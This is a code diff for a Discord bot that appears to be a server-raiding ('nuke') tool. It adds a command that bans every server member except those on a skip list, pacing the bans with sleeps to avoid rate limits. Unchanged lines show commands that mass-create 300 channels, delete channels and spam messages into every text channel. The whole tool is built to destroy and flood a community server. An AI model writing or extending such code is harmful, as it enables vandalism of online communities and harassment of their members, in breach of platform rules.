@@ -8,6 +8,7 @@ BOT_TOKEN = "YOUR TOKEN HERE"
 MESSAGE = "YOUR MESSAGE HERE"
 CHANNEL_NAME = "CHANNEL NAME"
 CHANNELS_CREATED = 300
+SKIPPED_USERS = [] # User ID's that the ban all command will skip
 
 
 @bot.command()
@@ -23,10 +24,28 @@ async def delete(ctx):  # Good for cleaning up a server
             except discord.HTTPException:
                 pass
 
+@bot.command()
+async def ban(ctx):
+    tasks = []
+    guild = ctx.guild
+    for member in guild.members:
+        if member != bot.user and member.id not in SKIPPED_USERS:
+            tasks.append(ban_member(member)) 
+
+    for task in tasks:
+        await task
+        await asyncio.sleep(5)  
+
+async def ban_member(member):
+    try:
+        await member.ban()  
+    except Exception as e:
+        print(f"Failed to ban {member}: {e}")
+
+
 
 async def create(ctx):
     guild = ctx.guild  
-    print("Creating channels...")
     for i in range(CHANNELS_CREATED):
         try:
             channel_name = CHANNEL_NAME 
@@ -42,14 +61,11 @@ async def message(ctx):
         guild = ctx.guild  
         if guild:
             tasks = []  
-
             for channel in guild.text_channels:
                 tasks.append(spam_messages(channel))
-        
             await asyncio.gather(*tasks)
         else:
             pass
-
     except Exception:
         pass
 
